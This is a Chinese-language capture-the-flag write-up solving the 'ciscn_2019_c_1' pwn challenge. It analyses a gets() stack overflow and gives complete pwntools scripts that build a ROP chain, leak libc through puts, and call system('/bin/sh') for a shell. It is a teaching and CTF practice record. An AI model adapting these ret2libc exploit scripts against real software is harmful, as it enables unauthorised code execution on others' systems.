**新手上路，欢迎交流指错**

**参考与致谢**  
> 本题解题思路参考了以下资源，感谢原作者的分享：
> https://blog.csdn.net/2301_76794844/article/details/148954691 作者: @谁把我灯关了

先checksec

<img width="361" height="148" alt="image" src="https://github.com/user-attachments/assets/576c02f5-0140-4e37-b62b-2552ffb0aa48" />

开了NX栈不可执行，并且是64位程序

再file一下(差点忘了)

<img width="796" height="90" alt="屏幕截图 2026-05-29 212939" src="https://github.com/user-attachments/assets/d5400b50-faae-4211-ae78-99acbc530273" />

知道是动态链接，再看看IDA main

<img width="915" height="793" alt="image" src="https://github.com/user-attachments/assets/f2dbe6ab-cedb-4fec-8ef6-1b465a20cd6f" />

观察伪代码运行逻辑，发现 v4==1 就可以进入 encrypt() ，v4==2 是重新选择，v4==1是exit退出

<img width="902" height="180" alt="image" src="https://github.com/user-attachments/assets/dfdd6418-aa89-4c38-9848-e5f28266f67d" />

那么点进 encrypt() 里面看看

<img width="561" height="728" alt="image" src="https://github.com/user-attachments/assets/948f2935-a965-49d4-9c5d-f54f132a1cd2" />

发现及其危险的 gets() 函数，然后就想 F12+shift 看看有没有什么 system,/bin/sh 之类的让我能利用利用

<img width="1170" height="669" alt="image" src="https://github.com/user-attachments/assets/dbc8bd6f-fa69-4637-a2e2-500f049cb005" />

发现没有

那么进行详细分析，接下来应该怎样做
 
>  [!IMPORTANT]
> **根据栈溢出，我们能想到的做法有：**
> 
> ret 2 text
> 
> ret 2 shellcode
> 
> ret 2 syscall
> 
> ret 2 libc
>
> **接下来进行可行性分析：**
>
>  <ret 2 text> :
>
> 在text段有现有的函数或代码片段可以被我们利用，比如说现成的system(/bin/sh)后门函数，或gadget（pop rid,ret)等 
> 缺点是：依赖现有程序，可能找不到，优点是：不需要泄露地址，比较简单
>
>  <ret 2 shellcode> :
>
> 在栈或堆上执行构造过的机器码（shellcode），但在现在的环境中极少出现，实用性不高
>
>  <ret 2 syscall> :
>
> 在有NX且没有开启PIE的静态链接程序，找不到system(/bin/sh)，用gadget拼接出exeve("/bin/sh",NULL,NULL)
>
> 利用步骤
>
>1. 检查程序属性：checksec 确认 NX 开启、静态链接、无 PIE。
>
>2. 寻找 gadget：用 ROPgadget 查找 pop 寄存器; ret、int 0x80 或 syscall。
>
>3. 定位 "/bin/sh"：若无该字符串，可用 read() 写入到 .bss 段。
>
>4. 计算偏移量：GDB 调试，输入特定长度数据直到覆盖返回地址。
>
>5. 构造 payload：按系统调用约定依次设置寄存器并触发系统调用。
>
> <ret 2 libc> : 跳转到动态链接库(libc.so)中的函数(system,execve等)
>
> 原理：大多数题都动态链接
>
> 难点：ASLR(地址空间布局随机化)会导致libc基址每次运行都会改变


理清思路，先利用gets函数漏洞获得偏移量,构造payload需要利用 puts_got , puts_plt 打印（泄露）出puts的地址 ，然后不要忘记返回地址，以便于第二次攻击，那么我就应该吧elf=ELF(./文件名)安排上，因为可以自动解析ELF二进制文件的函数地址，GOT/PLT，架构，字符串位置等，解放双手，还要把最终结果打印出来方便检查，那么就需要对获得的puts地址进行处理与输出,也就是：

puts_addr=u64(r.recvuntil("\n")[:-1].ljust(8,b"\x00"))

print(hex(puts_addr))
 
那就先找找构造所需要的地址，也就是 pop rid;ret 与 需要的返回地址

<img width="719" height="167" alt="image" src="https://github.com/user-attachments/assets/556c6c84-0893-4be6-86c3-af7de16465fa" />


<img width="798" height="458" alt="image" src="https://github.com/user-attachments/assets/9b793a86-4c25-42f9-8b3a-06f41e381751" />

构造第一次payload

```python
from pwn import *

r=remote("4c9dc9ac.tcp-ctf2.dasctf.com", 9999, ssl=True)
elf=ELF("./ciscn_2019_c_1")

pop_rdi_addr=0x400c83
put_got=elf.got["puts"]
put_plt=elf.plt["puts"]
encrypt_addr=0x4009A0

r.sendlineafter("Input your choice!",str(1))

payload=b"a"*88+p64(pop_rdi_addr)+p64(put_got)+p64(put_plt)+p64(encrypt_addr)
r.sendline(payload)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
puts_addr=u64(r.recvuntil("\n")[:-1].ljust(8,b"\x00"))
print(hex(puts_addr))

r.interactive()
```
打印出来的puts地址是：

<img width="797" height="88" alt="image" src="https://github.com/user-attachments/assets/b2438e48-54b3-4043-96c0-9e3ccbb2c1f9" />

既然成功了，那么就可以计算基地址了，依靠LibcSearcher

先在开头导入 from LibcSearcher import * 再利用LibcSearch查找 libc=LibcSearch("put",puts_addr)

*利用dump方法可以自动查找一个函数在本道题指定的libc版本中找到该函数偏移量*

libc_base=puts_addr-libc.dump("puts)

然后简单多了，就套公式了

system_addr=libc_base+libc.dump("system")

bin_sh_addr=libc_base+libc.dump("str_bin_sh")

#很多萌新可能和我一样，好奇为什么这里要用str_bin_sh，我总结了一下，只是LibcSearcher的键名这样设置，以后多写几次就记住了

差不多了，添加第二次 payload 内容

> [!IMPORTANT]
> 之所以在第二次构造 payload 的时候多加了一个 ret_addr 是因为要保证栈对齐，而栈对齐的要求，不是针对我构造的payload，而是针对system的内部运行状态
>
><img width="958" height="1001" alt="image" src="https://github.com/user-attachments/assets/22f4871a-027b-44d4-a9d2-b0812667fba5" />
>
>推理过程：
>
> 1.movaps要求执行时RSP%16==0
>
> 2.又因为在movaps之前还有一条push rbp(8字节)
>
> 3.所以在进入system函数之前，RSP必须满足RSP%16==8
>
> (这样 push rbp 减去8之后，RSP才会变成16的倍数)

> 
> 新手容易混淆的是到底是什么改变了 RSP？
>
> 只有CPU执行特定汇编指令，RSP才会变
> 
> 1.ret:弹出8字节给RIP，RSP + 8
>
> 2.pop xxx:弹出8字节给某个寄存器，RSP + 8
>
> 3.call:压入8字节返回地址，RSP - 8
>
> 4.push:压入8字节数据，RSP - 8
>
> 把payload想像成一排在书架上的书，自己的手指是RSP（栈指针），往书架上放多少书（构造payload），是不影响我真正要看书时（CPU执行）手指（RSP）的移动的


```python
from pwn import *
from LibcSearcher import *

r=remote("7c6c798a.tcp-ctf2.dasctf.com", 9999, ssl=True)
elf=ELF("./ciscn_2019_c_1")

pop_rdi_addr=0x400c83
put_got=elf.got["puts"]
put_plt=elf.plt["puts"]
encrypt_addr=0x4009A0
ret_addr=0x4006b9

r.sendlineafter("Input your choice!",b"1")

payload=b"a"*88+p64(pop_rdi_addr)+p64(put_got)+p64(put_plt)+p64(encrypt_addr)
r.sendline(payload)
r.recvline()
r.recvline()
r.recvline()
r.recvline()
puts_addr=u64(r.recvuntil(b"\n")[:-1].ljust(8,b"\x00"))
print(hex(puts_addr))

libc=LibcSearcher("puts",puts_addr)
libc_base=puts_addr-libc.dump("puts")

system_addr=libc_base+libc.dump("system")
bin_sh_addr=libc_base+libc.dump("str_bin_sh")

print(hex(system_addr))
payload1=b"a"*88+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)+p64(encrypt_addr)
r.sendline(payload1)

r.interactive()
```

以上是完整的payload

成功获取flag

<img width="2531" height="874" alt="image" src="https://github.com/user-attachments/assets/d20118c2-c9a1-4e6c-9a80-bba93d495da4" />

PS：记录一下（换了个网址，我竟然蹭到第一个做完的了）

<img width="1530" height="1383" alt="屏幕截图 2026-06-02 200030" src="https://github.com/user-attachments/assets/d92f086f-eaf5-4c5b-bd4e-5e7304a4c149" />

<img width="2160" height="999" alt="屏幕截图 2026-06-02 200108" src="https://github.com/user-attachments/assets/0407d240-a054-43bc-b633-939f819354a7" />

